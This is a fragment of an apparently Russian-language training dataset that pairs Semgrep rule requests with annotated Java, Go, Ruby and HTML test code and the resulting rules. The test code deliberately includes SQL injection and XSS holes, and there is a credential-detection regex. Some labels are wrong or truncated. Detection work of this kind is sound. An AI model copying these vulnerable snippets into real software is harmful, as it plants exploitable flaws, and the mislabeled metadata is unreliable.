    "output": "rules:\n- id: gcp-sub-network-logging-enabled\n  patterns:\n  - pattern: |\n      resource \"google_compute_subnetwork\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"google_compute_subnetwork\" $ANYTHING {\n        ...\n        log_config {\n          ...\n        }        \n        ...\n      }\n  message: Ensure that VPC Flow Logs is enabled for every subnet in a VPC Network\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    technology:\n    - terraform\n    - gcp\n    category: security\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Compute Engine Subnetworks в конфигурациях Terraform, где отсутствует блок log_config, необходимый для включения журналов сетевого трафика (VPC Flow Logs). Анализ выполняется путем поиска всех ресурсов типа google_compute_subnetwork и проверки наличия внутри них блока log_config. Если такой блок отсутствует, генерируется предупреждение о недостаточной строгости контроля доступа.\n\n# Ключевые элементы:\n- ID: gcp-sub-network-logging-enabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-sub-network-logging-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: hibernate-sqli\nОписание уязвимости: Detected a formatted string in a SQL statement. This could lead to SQL injection if variables in the SQL statement are not properly sanitized. Use a prepared statements (java.sql.PreparedStatement) instead. You can obtain a PreparedStatement using 'connection.prepareStatement'.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: hibernate-sqli.java\npackage testcode.sqli;\n\nimport org.hibernate.Criteria;\nimport org.hibernate.Session;\nimport org.hibernate.SessionFactory;\nimport org.hibernate.criterion.Restrictions;\nimport org.hibernate.type.StandardBasicTypes;\nimport org.hibernate.type.Type;\n\npublic class HibernateSql {\n\n    public void testQueries(SessionFactory sessionFactory, String input) {\n\n        Session session = sessionFactory.openSession();\n\n        Criteria criteria = session.createCriteria(UserEntity.class);\n\n        // ruleid: hibernate-sqli\n        criteria.add(Restrictions.sqlRestriction(\"test=1234\" + input + \"zzz\"));\n        // ruleid: hibernate-sqli\n        session.createQuery(\"select t from UserEntity t where id = \" + input);\n        // ruleid: hibernate-sqli\n        session.createSQLQuery(String.format(\"select * from TestEntity where id = %s \", input));\n        // ruleid: hibernate-sqli\n        criteria.add(Restrictions.sqlRestriction(\"param1  = ? and param2 = \" + input,input, StandardBasicTypes.STRING));\n        // ruleid: hibernate-sqli\n        criteria.add(Restrictions.sqlRestriction(\"param1  = ? and param2 = \" + input,new String[] {input}, new Type[] {StandardBasicTypes.STRING}));\n\n        // ok: hibernate-sqli\n        criteria.add(Restrictions.sqlRestriction(\"test=1234\"));\n\n        final String localSafe = \"where id=1337\";\n        // ok: hibernate-sqli\n        session.createQuery(\"select t from UserEntity t \" + localSafe);\n\n        final String localSql = \"select * from TestEntity \" + localSafe;\n        // ok: hibernate-sqli\n        session.createSQLQuery(localSql);\n\n        // ok: hibernate-sqli\n        criteria.add(Restrictions.sqlRestriction(\"param1  = ?\",input, StandardBasicTypes.STRING));\n        // ok: hibernate-sqli\n        criteria.add(Restrictions.sqlRestriction(\"param1  = ? and param2 = ?\", new String[] {input}, new Type[] {StandardBasicTypes.STRING}));\n\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• criteria.add(Restrictions.sqlRestriction(\"test=1234\" + input + \"zzz\"));\n• session.createQuery(\"select t from UserEntity t where id = \" + input);\n• session.createSQLQuery(String.format(\"select * from TestEntity where id = %s \", input));\n\nБезопасные паттерны:  \n• criteria.add(Restrictions.sqlRestriction(\"test=1234\"));\n• final String localSafe = \"where id=1337\"; session.createQuery(\"select t from UserEntity t \" + localSafe);\n• final String localSql = \"select * from TestEntity \" + localSafe; session.createSQLQuery(localSql)\n\nЛегенда аннотаций:\n- // ruleid:hibernate-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hibernate-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: hibernate-sqli\n  pattern-either:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          String $SQL = $X + $Y;\n          ...\n      - pattern-inside: |\n          String $SQL = String.format(...);\n          ...\n      - pattern-inside: |\n          $VAL $FUNC(...,String $SQL,...) {\n          ...\n          }\n    - pattern-not-inside: |\n        String $SQL = \"...\" + \"...\";\n        ...\n    - pattern: org.hibernate.criterion.Restrictions.sqlRestriction($SQL,...)\n  - pattern: org.hibernate.criterion.Restrictions.sqlRestriction(String.format(...),...)\n  - patterns:\n    - pattern: org.hibernate.criterion.Restrictions.sqlRestriction($X + $Y,...)\n    - pattern-not: org.hibernate.criterion.Restrictions.sqlRestriction(\"...\" + \"...\",...)\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern-inside: |\n              String $SQL = $X + $Y;\n              ...\n          - pattern-inside: |\n              String $SQL = String.format(...);\n              ...\n          - pattern-inside: |\n              $TYPE $FUNC(...,String $SQL,...) {\n                ...\n              }\n        - pattern-not-inside: |\n            String $SQL = \"...\" + \"...\";\n            ...\n        - pattern: $SESSION.$METHOD($SQL,...)\n      - pattern: |\n          $SESSION.$METHOD(String.format(...),...);\n      - pattern: |\n          $SESSION.$METHOD($X + $Y,...);\n    - pattern-either:\n      - pattern-inside: |\n          org.hibernate.Session $SESSION = ...;\n          ...\n      - pattern-inside: |\n          $TYPE $FUNC(...,org.hibernate.Session $SESSION,...) {\n            ...\n          }\n    - pattern-not: |\n        $SESSION.$METHOD(\"...\" + \"...\",...);\n    - metavariable-regex:\n        metavariable: $METHOD\n        regex: ^(createQuery|createSQLQuery)$\n  message: >-\n    Detected a formatted string in a SQL statement. This could lead to SQL\n    injection if variables in the SQL statement are not properly sanitized.\n    Use a prepared statements (java.sql.PreparedStatement) instead. You\n    can obtain a PreparedStatement using 'connection.prepareStatement'.\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#SQL_INJECTION_HIBERNATE\n    asvs:\n      section: V5 Stored Cryptography Verification Requirements\n      control_id: 5.3.5 Insecure Custom Algorithm\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v53-output-encoding-and-injection-prevention-requirements\n      version: '4'\n    category: security\n    technology:\n    - hibernate\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages: [java]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей SQL-инъекции в Hibernate. Оно ищет конструкции, где строка SQL формируется динамически путем объединения строк или использования форматирования строк, что может привести к инъекции SQL при неправильной обработке переменных. Правило использует шаблоны для обнаружения таких конструкций внутри вызовов методов createQuery, createSQLQuery и sqlRestriction, а также внутри выражений, содержащих конкатенацию строк или форматирование строк. Исключения сделаны для случаев, когда строка SQL жестко закодирована или используется подготовленный оператор (PreparedStatement).\n\n# Ключевые элементы:\n- ID: hibernate-sqli\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "hibernate-sqli",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: file-disclosure\nОписание уязвимости: Special requests can determine whether a file exists on a filesystem that's outside the Rails app's root directory. To fix this, set config.serve_static_assets = false.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: file-disclosure.rb\ndef bad_file_disclosure\n    # ruleid: file-disclosure\n    config.serve_static_assets = true\nend\n\ndef ok_file_disclosure\n    # ok: file-disclosure\n    config.serve_static_assets = false\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• config.serve_static_assets = true\n• config.serve_static_assets=true\n• config[:serve_static_assets] = true\n\nБезопасные паттерны:  \n• config.serve_static_assets = false\n• config.serve_static_assets=false\n• config[:serve_static_assets] = false\n\nЛегенда аннотаций:\n- // ruleid:file-disclosure: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:file-disclosure: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: file-disclosure\n  message: >-\n    Special requests can determine whether a file exists on a filesystem that's outside\n    the Rails app's\n    root directory. To fix this, set config.serve_static_assets = false.\n  metadata:\n    cwe:\n    - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n    references:\n    - https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_file_disclosure.rb\n    - https://groups.google.com/g/rubyonrails-security/c/23fiuwb1NBA/m/MQVM1-5GkPMJ\n    category: security\n    technology:\n    - ruby\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - ruby\n  severity: ERROR\n  pattern: config.serve_static_assets = true\n  fix-regex:\n    regex: =(\\s)*true\n    replacement: = false\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска присваивания значения 'true' переменной 'config.serve_static_assets', что может привести к disclosure файла. Анализ выполняется путем поиска конкретного шаблона в коде, который соответствует заданному условию. Правило использует простой шаблон 'pattern' для идентификации потенциально опасных выражений.\n\n# Ключевые элементы:\n- ID: file-disclosure\n- Язык: ruby \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "file-disclosure",
      "language": "ruby",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: sidekiq-secret\nОписание уязвимости: A gitleaks sidekiq-secret was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: sidekiq-secret.go\n// ruleid: sidekiq-secret\nBUNDLE_ENTERPRISE__CONTRIBSYS__COM: cafebabe:deadbeef export  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: sidekiq-secret.go\n// ruleid: sidekiq-secret\nBUNDLE_ENTERPRISE__CONTRIBSYS__COM: cafebabe:deadbeef export\n• // File: another-sidekiq-secret.go\n// ruleid: sidekiq-secret\nBUNDLE_GEMS__CONTRIBSYS__COM: 12345678:abcd1234 export\n\nБезопасные паттерны:  \n• // File: safe-code.go\nvar secret string = os.Getenv(\"SECRET_KEY\")\n• // File: secure-go-code.go\nconst secretKey = \"securely-retrieved-from-vault\"\n\nЛегенда аннотаций:\n- // ruleid:sidekiq-secret: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sidekiq-secret: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sidekiq-secret\n  message: A gitleaks sidekiq-secret was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:BUNDLE_ENTERPRISE__CONTRIBSYS__COM|BUNDLE_GEMS__CONTRIBSYS__COM)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-f0-9]{8}:[a-f0-9]{8})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных секретов в исходном коде Go. Оно ищет строки, содержащие идентификаторы 'BUNDLE_ENTERPRISE__CONTRIBSYS__COM' или 'BUNDLE_GEMS__CONTRIBSYS__COM', за которыми следуют двоичные данные в формате hex, представляющие собой 16-байтовый хеш. Это типичный шаблон, используемый Gitleaks для обнаружения утечек секретов в исходном коде.\n\n# Ключевые элементы:\n- ID: sidekiq-secret\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "sidekiq-secret",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: django-no-csrf-token\nОписание уязвимости: Manually-created forms in django templates should specify a csrf_token to prevent CSRF attacks.\nCWE: C\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: django-no-csrf-token.html\n<div class=\"container\">\n  <div class=\"row\">\n      <div class=\"col-6\">\n<!-- ruleid: django-no-csrf-token -->\n          <form method=\"post\">\n              <input type=\"text\" name=\"some_field\">Some Field</input>\n              <input type=\"submit\" name=\"submit\">Submit</input>\n          </form>\n      </div>\n  </div>\n</div>\n\n<div class=\"container\">\n  <div class=\"row\">\n      <div class=\"col-6\">\n<!-- ruleid: django-no-csrf-token -->\n          <form method='POST'>\n              <input type=\"text\" name=\"some_field\">Some Field</input>\n              <input type=\"submit\" name=\"submit\">Submit</input>\n          </form>\n      </div>\n  </div>\n</div>\n\n<div class=\"container\">\n  <div class=\"row\">\n      <div class=\"col-6\">\n<!-- ruleid: django-no-csrf-token -->\n          <form method='PUT'>\n              <input type=\"text\" name=\"some_field\">Some Field</input>\n              <input type=\"submit\" name=\"submit\">Submit</input>\n          </form>\n      </div>\n  </div>\n</div>\n\n<div class=\"container\">\n  <div class=\"row\">\n      <div class=\"col-6\">\n          <form method=\"post\">\n<!-- ok: django-no-csrf-token -->\n            {% csrf_token %}\n              <input type=\"text\" name=\"some_field\">Some Field</input>\n              <input type=\"submit\" name=\"submit\">Submit</input>\n          </form>\n      </div>\n  </div>\n</div>\n\n<div class=\"container\">\n  <div class=\"row\">\n      <div class=\"col-6\">\n          <form method=\"delete\">\n<!-- ok: django-no-csrf-token -->\n            {% csrf_token %}\n              <input type=\"text\" name=\"some_field\">Some Field</input>\n              <input type=\"submit\" name=\"submit\">Submit</input>\n          </form>\n      </div>\n  </div>\n</div>\n\n<div class=\"container\">\n  <div class=\"row\">\n      <div class=\"col-6\">\n<!-- ok: django-no-csrf-token -->\n          <form>\n              <input type=\"text\" name=\"some_field\">Some Field</input>\n              <input type=\"submit\" name=\"submit\">Submit</input>\n          </form>\n      </div>\n  </div>\n</div>\n\n<div c  # Ограничиваем длину\n\nОпасные паттерны:\n• <form method=\"POST\">...</form>\n• <form method='PUT'>...</form>\n• <form method='DELETE'>...</form>\n\nБезопасные паттерны:  \n• <form method=\"POST\">{% csrf_token %}...</form>\n• <form method=\"DELETE\">{{ name_form.csrf_token }}...</form>\n\nЛегенда аннотаций:\n- // ruleid:django-no-csrf-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:django-no-csrf-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: django-no-csrf-token\n    patterns:\n      - pattern: \"<form...>...</form>\"\n      - pattern-either:\n          - pattern: |\n              <form ... method=\"$METHOD\" ...>...</form>\n          - pattern: |\n              <form ... method='$METHOD' ...>...</form>\n          - pattern: |\n              <form ... method=$METHOD ...>...</form>\n      - metavariable-regex:\n          metavariable: $METHOD\n          regex: (?i)(post|put|delete|patch)\n      - pattern-not-inside: \"<form...>...{% csrf_token %}...</form>\"\n      - pattern-not-inside: \"<form...>...{{ $VAR.csrf_token }}...</form>\"\n    message: Manually-created forms in django templates should specify a csrf_token to prevent CSRF attacks.\n    languages: [generic]\n    severity: WARNING\n    metadata:\n      category: security\n      cwe: \"CWE-352: Cross-Site Request Forgery (CSRF)\"\n      references:\n      - https://docs.djangoproject.com/en/4.2/howto/csrf/\n      confidence: MEDIUM\n      likelihood: MEDIUM\n      impact: MEDIUM\n      subcategory:\n        - audit\n      technology:\n        - django\n    paths:\n      include:\n        - \"*.html\"\n\n\n# Логика правила:\nЭто правило ищет формы в Django шаблонах, которые не содержат тегов {%- csrf_token %} или {{ var.csrf_token }}. Анализируются атрибуты метода формы (<form method=...>) и проверяется наличие этих тегов вне формы. Правило применимо только к HTML-файлам и использует регулярные выражения для проверки методов HTTP-запросов.\n\n# Ключевые элементы:\n- ID: django-no-csrf-token\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "django-no-csrf-token",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения vertx-sqli\nОписание уязвимости: Detected a formatted string in a SQL statement. This could lead to SQL injection if variables in the SQL statement are not properly sanitized. Use a prepared statements (java.sql.PreparedStatement) instead. You can obtain a PreparedStatement using 'connection.prepareStatement'.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: vertx-sqli.java\npackage testcode.sqli;\n\nimport io.vertx.sqlclient.SqlClient;\nimport io.vertx.sqlclient.SqlConnection;\n\npublic class VertxSqlClient {\n\n    public void injection1(SqlClient client, String injection) {\n        // ruleid: vertx-sqli\n        client.query(injection);\n    }\n\n    public void injection2(SqlClient client, String injection) {\n        // ruleid: vertx-sqli\n        client.preparedQuery(injection);\n    }\n\n    public void injection3(SqlConnection conn, String injection) {\n        // ruleid: vertx-sqli\n        conn.prepare(injection);\n    }\n\n    public void injection4(SqlConnection conn, String injection) {\n        // ruleid: vertx-sqli\n        conn.prepare(injection, null);\n    }\n\n    public void falsePositive1(SqlClient client) {\n        String constantValue = \"SELECT * FROM test\";\n        // ok: vertx-sqli\n        client.query(constantValue);\n    }\n\n    public void falsePositive2(SqlConnection conn) {\n        String constantValue = \"SELECT * FROM test\";\n        // ok: vertx-sqli\n        conn.query(constantValue);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• client.query(injection);\n• client.preparedQuery(injection);\n• conn.prepare(injection);\n\nБезопасные паттерны:  \n• String constantValue = \"SELECT * FROM test\"; client.query(constantValue);\n• String constantValue = \"SELECT * FROM test\"; conn.query(constantValue);\n\nЛегенда аннотаций:\n- // ruleid:vertx-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:vertx-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: vertx-sqli\n  message: >-\n    Detected a formatted string in a SQL statement. This could lead to SQL\n    injection if variables in the SQL statement are not properly sanitized.\n    Use a prepared statements (java.sql.PreparedStatement) instead. You\n    can obtain a PreparedStatement using 'connection.prepareStatement'.\n  languages: [java]\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern-inside: |\n            String $SQL = $X + $Y;\n            ...\n        - pattern-inside: |\n            String $SQL = String.format(...);\n            ...\n        - pattern-inside: |\n            $TYPE $FUNC(...,String $SQL,...) {\n              ...\n            }\n      - pattern-not-inside: |\n          String $SQL = \"...\" + \"...\";\n          ...\n      - pattern: $SC.$METHOD($SQL,...)\n    - pattern: |\n        $SC.$METHOD(String.format(...),...);\n    - pattern: |\n        $SC.$METHOD($X + $Y,...);\n  - pattern-either:\n    - pattern-inside: |\n        SqlClient $SC = ...;\n        ...\n    - pattern-inside: |\n        SqlConnection $SC = ...;\n        ...\n    - pattern-inside: |\n        $TYPE $FUNC(...,SqlClient $SC,...) {\n          ...\n        }\n    - pattern-inside: |\n        $TYPE $FUNC(...,SqlConnection $SC,...) {\n          ...\n        }\n  - pattern-not: |\n      $SC.$METHOD(\"...\" + \"...\",...);\n  - metavariable-regex:\n      metavariable: $METHOD\n      regex: ^(query|preparedQuery|prepare)$\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    category: security\n    technology:\n    - vertx\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SQL-инъекции в коде Vert.x. Оно ищет вызовы методов query, preparedQuery и prepare в классах SqlClient и SqlConnection, где строка SQL формируется динамически через конкатенацию или форматирование строк. Правило исключает случаи, когда строка SQL является константой, объединенной с помощью оператора '+' и не содержит переменных. Также исключаются методы, принимающие жестко заданную строку SQL.\n\n# Ключевые элементы:\n- ID: vertx-sqli\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "vertx-sqli",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: raw-html-format\nОписание уязвимости: Detected user input flowing into a manually constructed HTML string. You may be accidentally bypassing secure methods of rendering HTML by manually constructing HTML and this could create a cross-site scripting vulnerability, which could let attackers steal sensitive user data. Use the `html/template` package which will safely render HTML instead, or inspect that the HTML is rendered safely.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: taint\nЯзык: go\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: go\n- Тип анализа: taint\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: raw-html-format.go\npackage main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n)\n\nfunc getMovieQuote() map[string]string {\n    m := make(map[string]string)\n    m[\"quote\"] = \"I'll be back.\"\n    m[\"movie\"] = \"The Terminator\"\n    m[\"year\"] = \"1984\"\n\n    return m\n}\n\nfunc healthCheck(w http.ResponseWriter, r *http.Request) {\n    // ok: raw-html-format\n    w.Write([]byte(\"alive\"))\n}\n\nfunc indexPage(w http.ResponseWriter, r *http.Request) {\n    const tme = `<html>`\n\n    const template = `\n    <html>\n    <body>\n      <h1>Random Movie Quotes</h1>\n      <h2>%s</h2>\n      <h4>~%s, %s</h4>\n    </body>\n    </html>`\n\n    quote := getMovieQuote()\n\n    quoteText := quote[\"quote\"]\n    movie := quote[\"movie\"]\n    year := quote[\"year\"]\n\n    w.WriteHeader(http.StatusAccepted)\n    // ok: raw-html-format\n    w.Write([]byte(fmt.Sprintf(template, quoteText, movie, year)))\n}\n\nfunc errorPage(w http.ResponseWriter, r *http.Request) {\n    params := r.URL.Query()\n    urls, ok := params[\"url\"]\n    if !ok {\n        log.Println(\"Error\")\n        return\n    }\n    url := urls[0]\n\n    const template = `\n    <html>\n    <body>\n      <h1>error; page not found. <a href=\"%s\">go back</a></h1>\n    </body>\n    </html>`\n\n    w.WriteHeader(http.StatusAccepted)\n    // ruleid:raw-html-format\n    w.Write([]byte(fmt.Sprintf(template, url)))\n}\n\nfunc errorPage2(w http.ResponseWriter, r *http.Request) {\n    params := r.URL.Query()\n    urls, ok := params[\"url\"]\n    if !ok {\n        log.Println(\"Error\")\n        return\n    }\n    url := urls[0]\n\n    const template = `\n    <html>\n    <body>\n      <h1>error; page not found. <a href=\"%s\">go back</a></h1>\n    </body>\n    </html>`\n\n    w.WriteHeader(http.StatusAccepted)\n    // ruleid:raw-html-format\n    w.Write([]byte(fmt.Printf(template, url)))\n}\n\nfunc errorPage3(w http.ResponseWriter, r *http.Request) {\n    params := r.URL.Query()\n    urls, ok := params[\"url\"]\n    if !ok {\n        log.Println(\"Error\")\n        return\n    }\n    url := urls[0]\n\n    const template = `\n     # Ограничиваем длину\n\nОпасные паттерны:\n• w.Write([]byte(fmt.Sprintf(template, url)))\n• w.Write([]byte(fmt.Printf(template, url)))\n• fmt.Fprintf(w, template, url)\n\nБезопасные паттерны:  \n• w.Write([]byte(\"alive\"))\n• w.Write([]byte(fmt.Sprintf(template, quoteText, movie, year)))\n• fmt.Fprintf(w, template, url)\n\nЛегенда аннотаций:\n- // ruleid:raw-html-format: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:raw-html-format: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: raw-html-format\n  languages: [go]\n  severity: WARNING\n  message: >-\n    Detected user input flowing into a manually constructed HTML string. You may be\n    accidentally bypassing secure methods\n    of rendering HTML by manually constructing HTML and this could create a cross-site\n    scripting vulnerability, which could\n    let attackers steal sensitive user data. Use the `html/template` package which\n    will safely render HTML instead, or inspect\n    that the HTML is rendered safely.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - go\n    references:\n    - https://blogtitle.github.io/robn-go-security-pearls-cross-site-scripting-xss/\n    confidence: MEDIUM\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          ($REQUEST : *http.Request).$ANYTHING\n      - pattern: |\n          ($REQUEST : http.Request).$ANYTHING\n    - metavariable-regex:\n        metavariable: $ANYTHING\n        regex: ^(BasicAuth|Body|Cookie|Cookies|Form|FormValue|GetBody|Host|MultipartReader|ParseForm|ParseMultipartForm|PostForm|PostFormValue|Referer|RequestURI|Trailer|TransferEncoding|UserAgent|URL)$\n  pattern-sanitizers:\n  - pattern: html.EscapeString(...)\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: fmt.Printf(\"$HTMLSTR\", ...)\n      - pattern: fmt.Sprintf(\"$HTMLSTR\", ...)\n      - pattern: fmt.Fprintf($W, \"$HTMLSTR\", ...)\n      - pattern: '\"$HTMLSTR\" + ...'\n    - metavariable-pattern:\n        metavariable: $HTMLSTR\n        language: generic\n        pattern: <$TAG ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных методов форматирования HTML, которые могут привести к XSS-уязвимостям. Источниками считаются переменные, полученные от HTTP-запроса, такие как BasicAuth, Body, Cookie, Form и другие. Синиками являются функции fmt.Printf, fmt.Sprintf, fmt.Fprintf и конкатенация строк с использованием знака '+' и угловых скобок '<', указывающих на потенциально опасные фрагменты HTML-кода. Правило также учитывает метапеременную $HTMLSTR, которая должна быть проверена на наличие опасных тегов.\n\n# Ключевые элементы:\n- ID: raw-html-format\n- Язык: go \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "raw-html-format",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: tainted-sql-string\nОписание уязвимости: Detected user input used to manually construct a SQL string. This is usually bad practice because manual construction could accidentally result in a SQL injection. An attacker could use a SQL injection to steal or modify contents of the database. Instead, use a parameterized query which is available by default in most database engines. Alternatively, consider using an object-relational mapper (ORM) such as SQLAlchemy which will protect your queries.\nCWE: CWE-704: Incorrect Type Conversion or Cast\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
